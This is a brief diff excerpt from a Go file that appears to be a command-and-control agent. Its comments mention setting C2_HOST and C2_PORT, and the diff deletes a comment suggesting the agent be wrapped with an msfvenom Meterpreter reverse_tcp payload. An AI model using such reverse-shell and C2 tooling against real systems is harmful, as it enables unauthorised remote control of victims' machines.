@@ -134,5 +134,3 @@ func getSystemInfo() string {
 //    c. Sets C2_HOST and C2_PORT environment variables
 //    d. Returns to kernel
 //
-// Alternative: Use msfvenom to wrap this agent:
-// msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=...
